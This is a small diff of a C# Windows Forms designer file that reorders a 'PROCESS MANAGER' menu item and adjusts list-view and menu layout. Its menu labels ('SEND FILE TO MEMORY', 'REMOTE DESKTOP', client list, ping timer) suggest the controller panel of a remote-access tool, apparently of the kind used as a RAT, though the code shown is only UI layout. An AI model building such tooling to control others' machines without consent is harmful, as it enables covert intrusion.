@@ -45,11 +45,11 @@
             this.sENDFILEToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.sENDFILETOMEMORYToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.rEMOTEDESKTOPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.pROCESSMANAGERToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.statusStrip1 = new System.Windows.Forms.StatusStrip();
             this.toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
             this.ping = new System.Windows.Forms.Timer(this.components);
             this.UpdateUI = new System.Windows.Forms.Timer(this.components);
-            this.pROCESSMANAGERToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.contextMenuStrip1.SuspendLayout();
             this.statusStrip1.SuspendLayout();
             this.SuspendLayout();
@@ -68,6 +68,8 @@
             this.listView1.GridLines = true;
             this.listView1.Location = new System.Drawing.Point(0, 0);
             this.listView1.Name = "listView1";
+            this.listView1.ShowGroups = false;
+            this.listView1.ShowItemToolTips = true;
             this.listView1.Size = new System.Drawing.Size(915, 342);
             this.listView1.TabIndex = 0;
             this.listView1.UseCompatibleStateImageBehavior = false;
@@ -107,7 +109,7 @@
             this.rEMOTEDESKTOPToolStripMenuItem,
             this.pROCESSMANAGERToolStripMenuItem});
             this.contextMenuStrip1.Name = "contextMenuStrip1";
-            this.contextMenuStrip1.Size = new System.Drawing.Size(275, 223);
+            this.contextMenuStrip1.Size = new System.Drawing.Size(275, 190);
             // 
             // cLIENTOPTIONSToolStripMenuItem
             // 
@@ -173,6 +175,13 @@
             this.rEMOTEDESKTOPToolStripMenuItem.Text = "REMOTE DESKTOP";
             this.rEMOTEDESKTOPToolStripMenuItem.Click += new System.EventHandler(this.rEMOTEDESKTOPToolStripMenuItem_Click);
             // 
+            // pROCESSMANAGERToolStripMenuItem
+            // 
+            this.pROCESSMANAGERToolStripMenuItem.Name = "pROCESSMANAGERToolStripMenuItem";
+            this.pROCESSMANAGERToolStripMenuItem.Size = new System.Drawing.Size(274, 30);
+            this.pROCESSMANAGERToolStripMenuItem.Text = "PROCESS MANAGER";
+            this.pROCESSMANAGERToolStripMenuItem.Click += new System.EventHandler(this.pROCESSMANAGERToolStripMenuItem_Click);
+            // 
             // statusStrip1
             // 
             this.statusStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
@@ -201,13 +210,6 @@
             this.UpdateUI.Enabled = true;
             this.UpdateUI.Interval = 1000;
             this.UpdateUI.Tick += new System.EventHandler(this.UpdateUI_Tick);
-            // 
-            // pROCESSMANAGERToolStripMenuItem
-            // 
-            this.pROCESSMANAGERToolStripMenuItem.Name = "pROCESSMANAGERToolStripMenuItem";
-            this.pROCESSMANAGERToolStripMenuItem.Size = new System.Drawing.Size(274, 30);
-            this.pROCESSMANAGERToolStripMenuItem.Text = "PROCESS MANAGER";
-            this.pROCESSMANAGERToolStripMenuItem.Click += new System.EventHandler(this.pROCESSMANAGERToolStripMenuItem_Click);
             // 
             // Form1
             // 
